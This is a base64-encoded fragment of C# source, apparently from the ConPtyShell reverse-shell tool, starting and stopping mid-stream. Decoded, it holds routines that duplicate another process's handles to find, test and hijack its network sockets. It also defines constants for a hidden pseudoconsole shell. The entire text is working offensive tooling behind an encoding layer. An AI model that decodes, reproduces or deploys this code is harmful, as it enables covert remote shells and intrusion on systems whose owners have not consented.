WwuRnJlZUhHbG9iYWwgYWZ0ZXIgeW91J3JlIGRvbmUgd2l0aCBpdAogICAgICAgIGVsc2UKICAgICAgICAgICAgTWFyc2hhbC5GcmVlSEdsb2JhbChpbmZvUHRyKTsvL2ZyZWUgcG9pbnRlciB3aGVuIG5vdCBTdWNjZXNzZnVsCiAgICAgICAgcmV0dXJuIEludFB0ci5aZXJvOwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxJbnRQdHI+IEdldFNvY2tldHNUYXJnZXRQcm9jZXNzKFByb2Nlc3MgdGFyZ2V0UHJvY2VzcykKICAgIHsKICAgICAgICBPQkpFQ1RfTkFNRV9JTkZPUk1BVElPTiBvYmpOYW1lSW5mbzsKICAgICAgICBsb25nIEhhbmRsZXNDb3VudCA9IDA7CiAgICAgICAgSW50UHRyIGR1cEhhbmRsZTsKICAgICAgICBJbnRQdHIgcHRyT2JqZWN0TmFtZTsKICAgICAgICBJbnRQdHIgcHRySGFuZGxlc0luZm87CiAgICAgICAgSW50UHRyIGhUYXJnZXRQcm9jZXNzOwogICAgICAgIHN0cmluZyBzdHJPYmplY3ROYW1lOwogICAgICAgIExpc3Q8SW50UHRyPiBzb2NrZXRzSGFuZGxlcyA9IG5ldyBMaXN0PEludFB0cj4oKTsKICAgICAgICBEZWFkbG9ja0NoZWNrSGVscGVyIGRlYWRsb2NrQ2hlY2tIZWxwZXJPYmogPSBuZXcgRGVhZGxvY2tDaGVja0hlbHBlcigpOwogICAgICAgIGhUYXJnZXRQcm9jZXNzID0gT3BlblByb2Nlc3MoUFJPQ0VTU19EVVBfSEFORExFLCBmYWxzZSwgdGFyZ2V0UHJvY2Vzcy5JZCk7CiAgICAgICAgaWYgKGhUYXJnZXRQcm9jZXNzID09IEludFB0ci5aZXJvKQogICAgICAgIHsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIkNhbm5vdCBvcGVuIHRhcmdldCBwcm9jZXNzIHdpdGggcGlkICIgKyB0YXJnZXRQcm9jZXNzLklkLlRvU3RyaW5nKCkgKyAiIGZvciBEdXBsaWNhdGVIYW5kbGUgYWNjZXNzIik7CiAgICAgICAgICAgIHJldHVybiBzb2NrZXRzSGFuZGxlczsKICAgICAgICB9CiAgICAgICAgcHRySGFuZGxlc0luZm8gPSBOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb25EeW5hbWljKFN5c3RlbUhhbmRsZUluZm9ybWF0aW9uLCAwKTsKICAgICAgICBIYW5kbGVzQ291bnQgPSBNYXJzaGFsLlJlYWRJbnRQdHIocHRySGFuZGxlc0luZm8pLlRvSW50NjQoKTsKICAgICAgICAvLyBjcmVhdGUgYSBwb2ludGVyIGF0IHRoZSBiZWdpbm5pbmcgb2YgdGhlIGFkZHJlc3Mgb2YgU1lTVEVNX0hBTkRMRV9UQUJMRV9FTlRSWV9JTkZPW10KICAgICAgICBJbnRQdHIgcHRySGFuZGxlc0luZm9DdXJyZW50ID0gbmV3IEludFB0cihwdHJIYW5kbGVzSW5mby5Ub0ludDY0KCkgKyBJbnRQdHIuU2l6ZSk7CiAgICAgICAgLy8gZ2V0IFR5cGVJbmRleCBmb3IgIkZpbGUiIG9iamVjdHMsIG5lZWRlZCB0byBmaWx0ZXIgb25seSBzb2NrZXRzIG9iamVjdHMKICAgICAgICBieXRlIFR5cGVJbmRleEZpbGVPYmplY3QgPSBHZXRUeXBlSW5kZXhCeU5hbWUoIkZpbGUiKTsKICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IEhhbmRsZXNDb3VudDsgaSsrKQogICAgICAgIHsKICAgICAgICAgICAgU1lTVEVNX0hBTkRMRV9UQUJMRV9FTlRSWV9JTkZPIHN5c0hhbmRsZTsKICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHN5c0hhbmRsZSA9IChTWVNURU1fSEFORExFX1RBQkxFX0VOVFJZX0lORk8pTWFyc2hhbC5QdHJUb1N0cnVjdHVyZShwdHJIYW5kbGVzSW5mb0N1cnJlbnQsIHR5cGVvZihTWVNURU1fSEFORExFX1RBQkxFX0VOVFJZX0lORk8pKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgfQogICAgICAgICAgICAvL21vdmUgcG9pbnRlciB0byBuZXh0IFNZU1RFTV9IQU5ETEVfVEFCTEVfRU5UUllfSU5GTwogICAgICAgICAgICBwdHJIYW5kbGVzSW5mb0N1cnJlbnQgPSAoSW50UHRyKShwdHJIYW5kbGVzSW5mb0N1cnJlbnQuVG9JbnQ2NCgpICsgTWFyc2hhbC5TaXplT2YodHlwZW9mKFNZU1RFTV9IQU5ETEVfVEFCTEVfRU5UUllfSU5GTykpKTsKICAgICAgICAgICAgaWYgKHN5c0hhbmRsZS5VbmlxdWVQcm9jZXNzSWQgIT0gdGFyZ2V0UHJvY2Vzcy5JZCB8fCBzeXNIYW5kbGUuT2JqZWN0VHlwZUluZGV4ICE9IFR5cGVJbmRleEZpbGVPYmplY3QpCiAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgaWYgKER1cGxpY2F0ZUhhbmRsZShoVGFyZ2V0UHJvY2VzcywgKEludFB0cilzeXNIYW5kbGUuSGFuZGxlVmFsdWUsIEdldEN1cnJlbnRQcm9jZXNzKCksIG91dCBkdXBIYW5kbGUsIDAsIGZhbHNlLCBEVVBMSUNBVEVfU0FNRV9BQ0NFU1MpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoZGVhZGxvY2tDaGVja0hlbHBlck9iai5DaGVja0RlYWRsb2NrRGV0ZWN0ZWQoZHVwSGFuZGxlKSkKICAgICAgICAgICAgICAgIHsgLy8gdGhpcyB3aWxsIGF2b2lkcyBkZWFkbG9ja3Mgb24gc3BlY2lhbCBuYW1lZCBwaXBlIGhhbmRsZXMKICAgICAgICAgICAgICAgICAgICAvLyBDb25zb2xlLldyaXRlTGluZSgiZGVidWc6IERlYWRsb2NrIGRldGVjdGVkIik7CiAgICAgICAgICAgICAgICAgICAgQ2xvc2VIYW5kbGUoZHVwSGFuZGxlKTsKICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHB0ck9iamVjdE5hbWUgPSBOdFF1ZXJ5T2JqZWN0RHluYW1pYyhkdXBIYW5kbGUsIE9CSkVDVF9JTkZPUk1BVElPTl9DTEFTUy5PYmplY3ROYW1lSW5mb3JtYXRpb24sIDApOwogICAgICAgICAgICAgICAgaWYgKHB0ck9iamVjdE5hbWUgPT0gSW50UHRyLlplcm8pCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgQ2xvc2VIYW5kbGUoZHVwSGFuZGxlKTsKICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIG9iak5hbWVJbmZvID0gKE9CSkVDVF9OQU1FX0lORk9STUFUSU9OKU1hcnNoYWwuUHRyVG9TdHJ1Y3R1cmUocHRyT2JqZWN0TmFtZSwgdHlwZW9mKE9CSkVDVF9OQU1FX0lORk9STUFUSU9OKSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIENsb3NlSGFuZGxlKGR1cEhhbmRsZSk7CiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAob2JqTmFtZUluZm8uTmFtZS5CdWZmZXIgIT0gSW50UHRyLlplcm8gJiYgb2JqTmFtZUluZm8uTmFtZS5MZW5ndGggPiAwKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHN0ck9iamVjdE5hbWUgPSBNYXJzaGFsLlB0clRvU3RyaW5nVW5pKG9iak5hbWVJbmZvLk5hbWUuQnVmZmVyLCBvYmpOYW1lSW5mby5OYW1lLkxlbmd0aCAvIDIpOwogICAgICAgICAgICAgICAgICAgIC8vIENvbnNvbGUuV3JpdGVMaW5lKCJkZWJ1ZzogZmlsZSBoYW5kbGUgMHgiICsgZHVwSGFuZGxlLlRvU3RyaW5nKCJYNCIpICsgIiBzdHJPYmplY3ROYW1lID0gIiArIHN0ck9iamVjdE5hbWUpOwogICAgICAgICAgICAgICAgICAgIGlmIChzdHJPYmplY3ROYW1lID09ICJcXERldmljZVxcQWZkIikKICAgICAgICAgICAgICAgICAgICAgICAgc29ja2V0c0hhbmRsZXMuQWRkKGR1cEhhbmRsZSk7CiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICBDbG9zZUhhbmRsZShkdXBIYW5kbGUpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIENsb3NlSGFuZGxlKGR1cEhhbmRsZSk7CiAgICAgICAgICAgICAgICBNYXJzaGFsLkZyZWVIR2xvYmFsKHB0ck9iamVjdE5hbWUpOwogICAgICAgICAgICAgICAgcHRyT2JqZWN0TmFtZSA9IEludFB0ci5aZXJvOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIE1hcnNoYWwuRnJlZUhHbG9iYWwocHRySGFuZGxlc0luZm8pOwogICAgICAgIExpc3Q8SW50UHRyPiBkdXBlZFNvY2tldHNIYW5kbGVzID0gRHVwbGljYXRlU29ja2V0c0Zyb21IYW5kbGVzKHNvY2tldHNIYW5kbGVzKTsKICAgICAgICBpZiAoZHVwZWRTb2NrZXRzSGFuZGxlcy5Db3VudCA+PSAxKQogICAgICAgICAgICBkdXBlZFNvY2tldHNIYW5kbGVzID0gRmlsdGVyQW5kT3JkZXJTb2NrZXRzQnlCeXRlc0luKGR1cGVkU29ja2V0c0hhbmRsZXMpOwogICAgICAgIHNvY2tldHNIYW5kbGVzID0gZHVwZWRTb2NrZXRzSGFuZGxlczsKICAgICAgICByZXR1cm4gc29ja2V0c0hhbmRsZXM7CiAgICB9CgogICAgcHVibGljIHN0YXRpYyBib29sIElzU29ja2V0SW5oZXJpdGVkKEludFB0ciBzb2NrZXRIYW5kbGUsIFByb2Nlc3MgcGFyZW50UHJvY2VzcykKICAgIHsKICAgICAgICBib29sIGluaGVyaXRlZCA9IGZhbHNlOwogICAgICAgIExpc3Q8SW50UHRyPiBwYXJlbnRTb2NrZXRzSGFuZGxlcyA9IEdldFNvY2tldHNUYXJnZXRQcm9jZXNzKHBhcmVudFByb2Nlc3MpOwogICAgICAgIGlmIChwYXJlbnRTb2NrZXRzSGFuZGxlcy5Db3VudCA8IDEpCiAgICAgICAgICAgIHJldHVybiBpbmhlcml0ZWQ7CiAgICAgICAgZm9yZWFjaCAoSW50UHRyIHBhcmVudFNvY2tldEhhbmRsZSBpbiBwYXJlbnRTb2NrZXRzSGFuZGxlcykKICAgICAgICB7CiAgICAgICAgICAgIFNPQ0tBRERSX0lOIHNvY2thZGRyVGFyZ2V0UHJvY2VzcyA9IG5ldyBTT0NLQUREUl9JTigpOwogICAgICAgICAgICBTT0NLQUREUl9JTiBzb2NrYWRkclBhcmVudFByb2Nlc3MgPSBuZXcgU09DS0FERFJfSU4oKTsKICAgICAgICAgICAgaW50IHNvY2thZGRyVGFyZ2V0UHJvY2Vzc0xlbiA9IE1hcnNoYWwuU2l6ZU9mKHNvY2thZGRyVGFyZ2V0UHJvY2Vzcyk7CiAgICAgICAgICAgIGludCBzb2NrYWRkclBhcmVudFByb2Nlc3NMZW4gPSBNYXJzaGFsLlNpemVPZihzb2NrYWRkclBhcmVudFByb2Nlc3MpOwogICAgICAgICAgICBpZiAoCiAgICAgICAgICAgICAgICAoZ2V0cGVlcm5hbWUoc29ja2V0SGFuZGxlLCByZWYgc29ja2FkZHJUYXJnZXRQcm9jZXNzLCByZWYgc29ja2FkZHJUYXJnZXRQcm9jZXNzTGVuKSA9PSAwKSAmJgogICAgICAgICAgICAgICAgKGdldHBlZXJuYW1lKHBhcmVudFNvY2tldEhhbmRsZSwgcmVmIHNvY2thZGRyUGFyZW50UHJvY2VzcywgcmVmIHNvY2thZGRyUGFyZW50UHJvY2Vzc0xlbikgPT0gMCkgJiYKICAgICAgICAgICAgICAgIChzb2NrYWRkclRhcmdldFByb2Nlc3Muc2luX2FkZHIgPT0gc29ja2FkZHJQYXJlbnRQcm9jZXNzLnNpbl9hZGRyICYmIHNvY2thZGRyVGFyZ2V0UHJvY2Vzcy5zaW5fcG9ydCA9PSBzb2NrYWRkclBhcmVudFByb2Nlc3Muc2luX3BvcnQpCiAgICAgICAgICAgICAgICkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgLy8gQ29uc29sZS5Xcml0ZUxpbmUoImRlYnVnOiBmb3VuZCBpbmhlcml0ZWQgc29ja2V0ISBoYW5kbGUgLS0+IDB4IiArIHBhcmVudFNvY2tldEhhbmRsZS5Ub1N0cmluZygiWDQiKSk7CiAgICAgICAgICAgICAgICBpbmhlcml0ZWQgPSB0cnVlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGNsb3Nlc29ja2V0KHBhcmVudFNvY2tldEhhbmRsZSk7CiAgICAgICAgfQogICAgICAgIHJldHVybiBpbmhlcml0ZWQ7CiAgICB9CgogICAgcHVibGljIHN0YXRpYyBib29sIElzU29ja2V0T3ZlcmxhcHBlZChJbnRQdHIgc29ja2V0KQogICAgewogICAgICAgIGJvb2wgcmV0ID0gZmFsc2U7CiAgICAgICAgSW50UHRyIHNvY2tFdmVudCA9IEludFB0ci5aZXJvOwogICAgICAgIGludCBudFN0YXR1cyA9IC0xOwogICAgICAgIFNPQ0tFVF9DT05URVhUIGNvbnRleHREYXRhID0gbmV3IFNPQ0tFVF9DT05URVhUKCk7CiAgICAgICAgbnRTdGF0dXMgPSBOdENyZWF0ZUV2ZW50KHJlZiBzb2NrRXZlbnQsIEVWRU5UX0FMTF9BQ0NFU1MsIEludFB0ci5aZXJvLCBTeW5jaHJvbml6YXRpb25FdmVudCwgZmFsc2UpOwogICAgICAgIGlmIChudFN0YXR1cyAhPSBOVFNUQVRVU19TVUNDRVNTKQogICAgICAgIHsKICAgICAgICAgICAgLy8gQ29uc29sZS5Xcml0ZUxpbmUoImRlYnVnOiBOdENyZWF0ZUV2ZW50IGZhaWxlZCB3aXRoIGVycm9yIGNvZGUgMHgiICsgbnRTdGF0dXMuVG9TdHJpbmcoIlg4IikpOyA7CiAgICAgICAgICAgIHJldHVybiByZXQ7CiAgICAgICAgfQogICAgICAgIElPX1NUQVRVU19CTE9DSyBJT1NCID0gbmV3IElPX1NUQVRVU19CTE9DSygpOwogICAgICAgIG50U3RhdHVzID0gTnREZXZpY2VJb0NvbnRyb2xGaWxlMShzb2NrZXQsIHNvY2tFdmVudCwgSW50UHRyLlplcm8sIEludFB0ci5aZXJvLCByZWYgSU9TQiwgSU9DVExfQUZEX0dFVF9DT05URVhULCBJbnRQdHIuWmVybywgMCwgcmVmIGNvbnRleHREYXRhLCBNYXJzaGFsLlNpemVPZihjb250ZXh0RGF0YSkpOwogICAgICAgIC8vIFdhaXQgZm9yIENvbXBsZXRpb24gCiAgICAgICAgaWYgKG50U3RhdHVzID09IE5UU1RBVFVTX1BFTkRJTkcpCiAgICAgICAgewogICAgICAgICAgICBXYWl0Rm9yU2luZ2xlT2JqZWN0KHNvY2tFdmVudCwgSU5GSU5JVEUpOwogICAgICAgICAgICBudFN0YXR1cyA9IElPU0Iuc3RhdHVzOwogICAgICAgIH0KICAgICAgICBDbG9zZUhhbmRsZShzb2NrRXZlbnQpOwoKICAgICAgICBpZiAobnRTdGF0dXMgIT0gTlRTVEFUVVNfU1VDQ0VTUykKICAgICAgICB7CiAgICAgICAgICAgIC8vIENvbnNvbGUuV3JpdGVMaW5lKCJkZWJ1ZzogTnREZXZpY2VJb0NvbnRyb2xGaWxlIGZhaWxlZCB3aXRoIGVycm9yIGNvZGUgMHgiICsgbnRTdGF0dXMuVG9TdHJpbmcoIlg4IikpOyA7CiAgICAgICAgICAgIHJldHVybiByZXQ7CiAgICAgICAgfQogICAgICAgIGlmICgoY29udGV4dERhdGEuU2hhcmVkRGF0YS5DcmVhdGlvbkZsYWdzICYgV1NBX0ZMQUdfT1ZFUkxBUFBFRCkgIT0gMCkgcmV0ID0gdHJ1ZTsKICAgICAgICByZXR1cm4gcmV0OwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgSW50UHRyIER1cGxpY2F0ZVRhcmdldFByb2Nlc3NTb2NrZXQoUHJvY2VzcyB0YXJnZXRQcm9jZXNzLCByZWYgYm9vbCBvdmVybGFwcGVkU29ja2V0KQogICAgewogICAgICAgIEludFB0ciB0YXJnZXRTb2NrZXRIYW5kbGUgPSBJbnRQdHIuWmVybzsKICAgICAgICBMaXN0PEludFB0cj4gdGFyZ2V0UHJvY2Vzc1NvY2tldHMgPSBHZXRTb2NrZXRzVGFyZ2V0UHJvY2Vzcyh0YXJnZXRQcm9jZXNzKTsKICAgICAgICBpZiAodGFyZ2V0UHJvY2Vzc1NvY2tldHMuQ291bnQgPCAxKSByZXR1cm4gdGFyZ2V0U29ja2V0SGFuZGxlOwogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIGZvcmVhY2ggKEludFB0ciBzb2NrZXRIYW5kbGUgaW4gdGFyZ2V0UHJvY2Vzc1NvY2tldHMpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIC8vIHdlIHByaW9yaXRpemUgdGhlIGhpamFja2luZyBvZiBPdmVybGFwcGVkIHNvY2tldHMKICAgICAgICAgICAgICAgIGlmICghSXNTb2NrZXRPdmVybGFwcGVkKHNvY2tldEhhbmRsZSkpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgLy8gQ29uc29sZS5Xcml0ZUxpbmUoImRlYnVnOiBGb3VuZCBhIHVzYWJsZSBzb2NrZXQsIGJ1dCBpdCBoYXMgbm90IGJlZW4gY3JlYXRlZCB3aXRoIHRoZSBmbGFnIFdTQV9GTEFHX09WRVJMQVBQRUQsIHNraXBwaW5nLi4uIik7CiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB0YXJnZXRTb2NrZXRIYW5kbGUgPSBzb2NrZXRIYW5kbGU7CiAgICAgICAgICAgICAgICBvdmVybGFwcGVkU29ja2V0ID0gdHJ1ZTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICB9CiAgICAgICAgICAgIC8vIG5vIE92ZXJsYXBwZWQgc29ja2V0cyBmb3VuZCwgZXhwYW5kaW5nIHRoZSBzY29wZSBieSBpbmNsdWRpbmcgYWxzbyBOb24tT3ZlcmxhcHBlZCBzb2NrZXRzCiAgICAgICAgICAgIGlmICh0YXJnZXRTb2NrZXRIYW5kbGUgPT0gSW50UHRyLlplcm8pIHsKICAgICAgICAgICAgICAgIC8vIENvbnNvbGUuV3JpdGVMaW5lKCJkZWJ1ZzogTm8gb3ZlcmxhcHBlZCBzb2NrZXRzIGZvdW5kLiBUcnlpbmcgdG8gcmV0dXJuIGFsc28gbm9uLW92ZXJsYXBwZWQgc29ja2V0cy4uLiIpOwogICAgICAgICAgICAgICAgZm9yZWFjaCAoSW50UHRyIHNvY2tldEhhbmRsZSBpbiB0YXJnZXRQcm9jZXNzU29ja2V0cykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICB0YXJnZXRTb2NrZXRIYW5kbGUgPSBzb2NrZXRIYW5kbGU7CiAgICAgICAgICAgICAgICAgICAgaWYgKCFJc1NvY2tldE92ZXJsYXBwZWQodGFyZ2V0U29ja2V0SGFuZGxlKSkgb3ZlcmxhcHBlZFNvY2tldCA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmICh0YXJnZXRTb2NrZXRIYW5kbGUgPT0gSW50UHRyLlplcm8pCiAgICAgICAgICAgIHRocm93IG5ldyBDb25QdHlTaGVsbEV4Y2VwdGlvbigiTm8gc29ja2V0cyBmb3VuZCwgc28gbm8gaGlqYWNrYWJsZSBzb2NrZXRzIDooIEV4aXRpbmcuLi4iKTsKICAgICAgICByZXR1cm4gdGFyZ2V0U29ja2V0SGFuZGxlOwogICAgfQogICAgcHVibGljIHN0YXRpYyB2b2lkIFNldFNvY2tldEJsb2NraW5nTW9kZShJbnRQdHIgc29ja2V0LCBpbnQgbW9kZSkKICAgIHsKICAgICAgICBpbnQgRklPTkJJTyA9IC0yMTQ3MTk1MjY2OwogICAgICAgIGludCBOb25CbG9ja2luZ01vZGUgPSAxOwogICAgICAgIGludCBCbG9ja2luZ01vZGUgPSAwOwogICAgICAgIGludCByZXN1bHQ7CiAgICAgICAgaWYgKG1vZGUgPT0gMSkKICAgICAgICAgICAgcmVzdWx0ID0gaW9jdGxzb2NrZXQoc29ja2V0LCBGSU9OQklPLCByZWYgTm9uQmxvY2tpbmdNb2RlKTsKICAgICAgICBlbHNlCiAgICAgICAgICAgIHJlc3VsdCA9IGlvY3Rsc29ja2V0KHNvY2tldCwgRklPTkJJTywgcmVmIEJsb2NraW5nTW9kZSk7CiAgICAgICAgaWYgKHJlc3VsdCA9PSAtMSkKICAgICAgICAgICAgdGhyb3cgbmV3IENvblB0eVNoZWxsRXhjZXB0aW9uKCJpb2N0bHNvY2tldCBmYWlsZWQgd2l0aCByZXR1cm4gY29kZSAiICsgcmVzdWx0LlRvU3RyaW5nKCkgKyAiIGFuZCB3c2FsYXN0ZXJyb3I6ICIgKyBXU0FHZXRMYXN0RXJyb3IoKS5Ub1N0cmluZygpKTsKICAgIH0KfQoKLy8gc291cmNlIGZyb20gLS0+IGh0dHBzOi8vc3RhY2tvdmVyZmxvdy5jb20vYS8zMzQ2MDU1CltTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KcHVibGljIHN0cnVjdCBQYXJlbnRQcm9jZXNzVXRpbGl0aWVzCnsKICAgIC8vIFRoZXNlIG1lbWJlcnMgbXVzdCBtYXRjaCBQUk9DRVNTX0JBU0lDX0lORk9STUFUSU9OCiAgICBpbnRlcm5hbCBJbnRQdHIgUmVzZXJ2ZWQxOwogICAgaW50ZXJuYWwgSW50UHRyIFBlYkJhc2VBZGRyZXNzOwogICAgaW50ZXJuYWwgSW50UHRyIFJlc2VydmVkMl8wOwogICAgaW50ZXJuYWwgSW50UHRyIFJlc2VydmVkMl8xOwogICAgaW50ZXJuYWwgSW50UHRyIFVuaXF1ZVByb2Nlc3NJZDsKICAgIGludGVybmFsIEludFB0ciBJbmhlcml0ZWRGcm9tVW5pcXVlUHJvY2Vzc0lkOwoKICAgIFtEbGxJbXBvcnQoIm50ZGxsLmRsbCIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBOdFF1ZXJ5SW5mb3JtYXRpb25Qcm9jZXNzKEludFB0ciBwcm9jZXNzSGFuZGxlLCBpbnQgcHJvY2Vzc0luZm9ybWF0aW9uQ2xhc3MsIHJlZiBQYXJlbnRQcm9jZXNzVXRpbGl0aWVzIHByb2Nlc3NJbmZvcm1hdGlvbiwgaW50IHByb2Nlc3NJbmZvcm1hdGlvbkxlbmd0aCwgb3V0IGludCByZXR1cm5MZW5ndGgpOwoKICAgIHB1YmxpYyBzdGF0aWMgUHJvY2VzcyBHZXRQYXJlbnRQcm9jZXNzKCkKICAgIHsKICAgICAgICByZXR1cm4gR2V0UGFyZW50UHJvY2VzcyhQcm9jZXNzLkdldEN1cnJlbnRQcm9jZXNzKCkuSGFuZGxlKTsKICAgIH0KCiAgICBwdWJsaWMgc3RhdGljIFByb2Nlc3MgR2V0UGFyZW50UHJvY2VzcyhpbnQgaWQpCiAgICB7CiAgICAgICAgUHJvY2VzcyBwcm9jZXNzID0gUHJvY2Vzcy5HZXRQcm9jZXNzQnlJZChpZCk7CiAgICAgICAgcmV0dXJuIEdldFBhcmVudFByb2Nlc3MocHJvY2Vzcy5IYW5kbGUpOwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgUHJvY2VzcyBHZXRQYXJlbnRQcm9jZXNzKEludFB0ciBoYW5kbGUpCiAgICB7CiAgICAgICAgUGFyZW50UHJvY2Vzc1V0aWxpdGllcyBwYmkgPSBuZXcgUGFyZW50UHJvY2Vzc1V0aWxpdGllcygpOwogICAgICAgIGludCByZXR1cm5MZW5ndGg7CiAgICAgICAgaW50IHN0YXR1cyA9IE50UXVlcnlJbmZvcm1hdGlvblByb2Nlc3MoaGFuZGxlLCAwLCByZWYgcGJpLCBNYXJzaGFsLlNpemVPZihwYmkpLCBvdXQgcmV0dXJuTGVuZ3RoKTsKICAgICAgICBpZiAoc3RhdHVzICE9IDApCiAgICAgICAgICAgIHRocm93IG5ldyBDb25QdHlTaGVsbEV4Y2VwdGlvbihzdGF0dXMuVG9TdHJpbmcoKSk7CiAgICAgICAgdHJ5CiAgICAgICAgewogICAgICAgICAgICByZXR1cm4gUHJvY2Vzcy5HZXRQcm9jZXNzQnlJZChwYmkuSW5oZXJpdGVkRnJvbVVuaXF1ZVByb2Nlc3NJZC5Ub0ludDMyKCkpOwogICAgICAgIH0KICAgICAgICBjYXRjaCAoQXJndW1lbnRFeGNlcHRpb24pCiAgICAgICAgewogICAgICAgICAgICAvLyBub3QgZm91bmQKICAgICAgICAgICAgcmV0dXJuIG51bGw7CiAgICAgICAgfQogICAgfQp9CgpwdWJsaWMgc3RhdGljIGNsYXNzIENvblB0eVNoZWxsCnsKICAgIHByaXZhdGUgY29uc3Qgc3RyaW5nIGVycm9yU3RyaW5nID0gInt7e0NvblB0eVNoZWxsRXhjZXB0aW9ufX19XHJcbiI7CiAgICBwcml2YXRlIGNvbnN0IHVpbnQgRU5BQkxFX1ZJUlRVQUxfVEVSTUlOQUxfUFJPQ0VTU0lORyA9IDB4MDAwNDsKICAgIHByaXZhdGUgY29uc3QgdWludCBESVNBQkxFX05FV0xJTkVfQVVUT19SRVRVUk4gPSAweDAwMDg7CiAgICBwcml2YXRlIGNvbnN0IHVpbnQgUFJPQ19USFJFQURfQVRUUklCVVRFX1BTRVVET0NPTlNPTEUgPSAweDAwMDIwMDE2OwogICAgcHJpdmF0ZSBjb25zdCB1aW50IEVYVEVOREVEX1NUQVJUVVBJTkZPX1BSRVNFTlQgPSAweDAwMDgwMDAwOwogICAgcHJpdmF0ZSBjb25zdCBpbnQgU1RBUlRGX1VTRVNUREhBTkRMRVMgPSAweDAwMDAwMTAwOwogICAgcHJpdmF0ZSBjb25zdCBpbnQgQlVGRkVSX1NJWkVfUElQRSA9IDEwNDg1NzY7CiAgICBwcml2YXRlIGNvbnN0IGludCBXU0FfRkxBR19PVkVSTEFQUEVEID0gMHgxOwogICAgcHJpdmF0ZSBjb25zdCBVSW50MzIgSU5GSU5JVEUgPSAweEZGRkZGRkZGOwogICAgcHJpdmF0ZSBjb25zdCBpbnQgU1dfSElERSA9IDA7CiAgICBwcml2YXRlIGNvbnN0IHVpbnQgR0VORVJJQ19SRUFEID0gMHg4MDAwMDAwMDsKICAgIHByaXZhdGUgY29uc3QgdWludCBHRU5FUklDX1dSSVRFID0gMHg0MDAwMDAwMDsKICAgIHByaXZhdGUgY29uc3QgdWludCBGSUxFX1NIQVJFX1JFQUQgPSAweDAwMDAwMDAxOwogICAgcHJpdmF0ZSBjb25zdCB1aW50IEZJTEVfU0hBUkVfV1JJVEUgPSAweDAwMDAwMDAyOwogICAgcHJpdmF0ZSBjb25zdCB1aW50IEZJTEVfQVRUUklCVVRFX05PUk1BTCA9IDB4ODA7CiAgICBwcml2YXRlIGNvbnN0IHVpbnQgT1BFTl9FWElTVElORyA9IDM7CiAgICBwcml2YXRlIGNvbnN0IGludCBTVERfSU5QVVRfSEFORExFID0gLTEwOwogICAgcHJpdmF0ZSBjb25zdCBpbnQgU1REX09VVFBVVF9IQU5ETEUgPSAtMTE7CiAgICBwcml2YXRlIGNvbnN0IGludCBTVERfRVJST1JfSEFORExFID0gLTEyOwogICAgcHJpdmF0ZSBjb25zdCBpbnQgV1NBRVdPVUxEQkxPQ0sgPSAxMDAzNTsKICAgIHByaXZhdGUgY29uc3QgaW50IEZEX1JFQUQgPSAoMSA8PCAwKTsKCgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIENoYXJTZXQgPSBDaGFyU2V0LlVuaWNvZGUpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgU1RBUlRVUElORk9FWAogICAgewogICAgICAgIHB1YmxpYyBTVEFSVFVQSU5GTyBTdGFydHVwSW5mbzsKICAgICAgICBwdWJsaWMgSW50UHRyIGxwQXR0cmlidXRlTGlzdDsKICAgIH0KCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCwgQ2hhclNldCA9IENoYXJTZXQuVW5pY29kZSldCiAgICBwcml2YXRlIHN0cnVjdCBTVEFSVFVQSU5GTwogICAgewogICAgICAgIHB1YmxpYyBJbnQzMiBjYjsKICAgICAgICBwdWJsaWMgc3RyaW5nIGxwUmVzZXJ2ZWQ7CiAgICAgICAgcHVibGljIHN0cmluZyBscERlc2t0b3A7CiAgICAgICAgcHVibGljIHN0cmluZyBscFRpdGxlOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd1g7CiAgICAgICAgcHVibGljIEludDMyIGR3WTsKICAgICAgI